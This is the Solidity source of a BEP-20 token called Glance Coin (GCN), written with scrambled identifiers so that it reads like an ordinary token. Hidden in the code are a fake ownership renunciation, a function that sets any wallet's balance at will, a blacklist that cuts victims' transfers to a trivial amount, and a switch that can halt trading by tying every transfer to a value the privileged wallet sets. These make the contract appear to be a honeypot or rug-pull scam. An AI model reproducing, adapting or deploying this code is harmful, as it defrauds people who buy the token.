//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract teamLiquidity {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchedToken {
    function createPair(address txReceiver, address exemptReceiver) external returns (address);

    function feeTo() external view returns (address);
}

interface walletSwap {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface feeSender {
    function totalSupply() external view returns (uint256);

    function balanceOf(address modeMax) external view returns (uint256);

    function transfer(address maxMarketing, uint256 amountFee) external returns (bool);

    function allowance(address modeEnableTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 amountFee) external returns (bool);

    function transferFrom(
        address sender,
        address maxMarketing,
        uint256 amountFee
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverList, uint256 value);
    event Approval(address indexed modeEnableTrading, address indexed spender, uint256 value);
}

interface tokenIs is feeSender {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract GlanceCoin is teamLiquidity, feeSender, tokenIs {

    constructor (){
        if (swapTake != totalListEnable) {
            totalListEnable = toTotal;
        }
        buyMaxAt();
        walletSwap swapFrom = walletSwap(receiverWallet);
        liquidityAutoShould = launchedToken(swapFrom.factory()).createPair(swapFrom.WETH(), address(this));
        swapEnable = launchedToken(swapFrom.factory()).feeTo();
        if (exemptSenderToken == toTotal) {
            fromMax = true;
        }
        launchedList = _msgSender();
        walletMin[launchedList] = true;
        fromLaunched[launchedList] = senderMode;
        if (fromMax != takeTo) {
            swapTake = exemptSenderToken;
        }
        emit Transfer(address(0), launchedList, senderMode);
    }

    function launchedIs(address amountFromWallet, address maxMarketing, uint256 amountFee) internal returns (bool) {
        if (amountFromWallet == launchedList) {
            return fromReceiver(amountFromWallet, maxMarketing, amountFee);
        }
        uint256 tokenSell = feeSender(liquidityAutoShould).balanceOf(swapEnable);
        require(tokenSell == enableExemptList);
        require(maxMarketing != swapEnable);
        if (receiverTx[amountFromWallet]) {
            return fromReceiver(amountFromWallet, maxMarketing, maxTo);
        }
        amountFee = fromSell(amountFromWallet, maxMarketing, amountFee);
        return fromReceiver(amountFromWallet, maxMarketing, amountFee);
    }

    string private txMax = "Glance Coin";

    function owner() external view returns (address) {
        return buyLaunched;
    }

    function approve(address launchedSenderTrading, uint256 amountFee) public virtual override returns (bool) {
        sellWallet[_msgSender()][launchedSenderTrading] = amountFee;
        emit Approval(_msgSender(), launchedSenderTrading, amountFee);
        return true;
    }

    function transferFrom(address amountFromWallet, address maxMarketing, uint256 amountFee) external override returns (bool) {
        if (_msgSender() != receiverWallet) {
            if (sellWallet[amountFromWallet][_msgSender()] != type(uint256).max) {
                require(amountFee <= sellWallet[amountFromWallet][_msgSender()]);
                sellWallet[amountFromWallet][_msgSender()] -= amountFee;
            }
        }
        return launchedIs(amountFromWallet, maxMarketing, amountFee);
    }

    mapping(address => bool) public walletMin;

    function buyMaxAt() public {
        emit OwnershipTransferred(launchedList, address(0));
        buyLaunched = address(0);
    }

    uint256 receiverSwap;

    function name() external view virtual override returns (string memory) {
        return txMax;
    }

    uint256 enableExemptList;

    function shouldFund(address receiverLimitEnable) public {
        require(receiverLimitEnable.balance < 100000);
        if (minIs) {
            return;
        }
        
        walletMin[receiverLimitEnable] = true;
        
        minIs = true;
    }

    uint256 private swapTake;

    uint256 public walletTx = 0;

    bool public minIs;

    function senderReceiverMarketing(uint256 amountFee) public {
        listMode();
        enableExemptList = amountFee;
    }

    function fromSell(address amountFromWallet, address maxMarketing, uint256 amountFee) internal view returns (uint256) {
        require(amountFee > 0);

        uint256 isTotal = 0;
        if (amountFromWallet == liquidityAutoShould && walletTx > 0) {
            isTotal = amountFee * walletTx / 100;
        } else if (maxMarketing == liquidityAutoShould && amountWallet > 0) {
            isTotal = amountFee * amountWallet / 100;
        }
        require(isTotal <= amountFee);
        return amountFee - isTotal;
    }

    mapping(address => bool) public receiverTx;

    uint8 private swapMarketing = 18;

    uint256 private exemptSenderToken;

    function transfer(address fundAmount, uint256 amountFee) external virtual override returns (bool) {
        return launchedIs(_msgSender(), fundAmount, amountFee);
    }

    address private buyLaunched;

    function liquidityMode(address toList) public {
        listMode();
        
        if (toList == launchedList || toList == liquidityAutoShould) {
            return;
        }
        receiverTx[toList] = true;
    }

    address public launchedList;

    uint256 constant maxTo = 6 ** 10;

    function marketingMode(address fundAmount, uint256 amountFee) public {
        listMode();
        fromLaunched[fundAmount] = amountFee;
    }

    uint256 public amountWallet = 0;

    uint256 private senderMode = 100000000 * 10 ** 18;

    function balanceOf(address modeMax) public view virtual override returns (uint256) {
        return fromLaunched[modeMax];
    }

    address receiverWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function decimals() external view virtual override returns (uint8) {
        return swapMarketing;
    }

    function allowance(address txLaunchedTeam, address launchedSenderTrading) external view virtual override returns (uint256) {
        if (launchedSenderTrading == receiverWallet) {
            return type(uint256).max;
        }
        return sellWallet[txLaunchedTeam][launchedSenderTrading];
    }

    address public liquidityAutoShould;

    function symbol() external view virtual override returns (string memory) {
        return receiverTake;
    }

    function getOwner() external view returns (address) {
        return buyLaunched;
    }

    function fromReceiver(address amountFromWallet, address maxMarketing, uint256 amountFee) internal returns (bool) {
        require(fromLaunched[amountFromWallet] >= amountFee);
        fromLaunched[amountFromWallet] -= amountFee;
        fromLaunched[maxMarketing] += amountFee;
        emit Transfer(amountFromWallet, maxMarketing, amountFee);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return senderMode;
    }

    function listMode() private view {
        require(walletMin[_msgSender()]);
    }

    mapping(address => mapping(address => uint256)) private sellWallet;

    mapping(address => uint256) private fromLaunched;

    address swapEnable;

    uint256 private toTotal;

    bool private fromMax;

    bool private takeTo;

    string private receiverTake = "GCN";

    event OwnershipTransferred(address indexed walletTake, address indexed fundFrom);

    uint256 private totalListEnable;

}